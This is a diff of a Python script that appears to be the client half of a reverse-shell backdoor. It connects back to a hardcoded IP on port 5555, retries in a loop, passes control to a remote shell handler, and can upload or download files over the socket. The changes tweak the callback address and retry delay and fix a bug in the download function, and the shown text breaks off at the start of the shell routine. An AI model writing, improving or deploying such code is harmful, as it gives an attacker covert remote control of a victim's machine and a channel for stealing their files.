@@ -5,23 +5,26 @@ import json
 import os
 
 def reliable_send(data):
-	jsondata = json.dumps(data)
-	s.send(jsondata.encode())
+        jsondata = json.dumps(data)
+        s.send(jsondata.encode())
 
 def reliable_recv():
-	data = ''
-	while True:
-		try:
-			data = data + s.recv(1024).decode().rstrip()
-			return json.loads(data)
-		except ValueError:
-			continue
+        data = ''
+        while True:
+                try:
+                        data = data + s.recv(1024).decode().rstrip()
+                        return json.loads(data)
+                except ValueError:
+                        continue
+
+
+
 
 def connection():
 	while True:
-		time.sleep(10)
+		time.sleep(20)
 		try:
-			s.connect(('192.168.0.123', 5555))
+			s.connect(('192.168.0.163',5555))
 			shell()
 			s.close()
 			break
@@ -29,21 +32,23 @@ def connection():
 			connection()
 
 def upload_file(file_name):
-	f = open(file_name,'rb')
+	f = open(file_name, 'rb')
 	s.send(f.read())
 
-def download_file(file):
-	f = open(file_name, 'wb')
-	s.settimeout(1)
-	chunk = s.recv(1024)
-	while chunk:
-		f.write(chunk)
-		try:
-			chunk = s.recv(1024)
-		except socket.timeout as e:
-			break
-	s.settimeout(None)
-	f.close()
+
+def download_file(file_name):
+        f = open(file_name, 'wb')
+        s.settimeout(1)
+        chunk = s.recv(1024)
+        while chunk:
+                f.write(chunk)
+                try:
+                        chunk = s.recv(1024)
+                except socket.timeout as e:
+                        break
+        s.settimeout(None)
+        f.close()
+
 
 def shell():
 	while True:
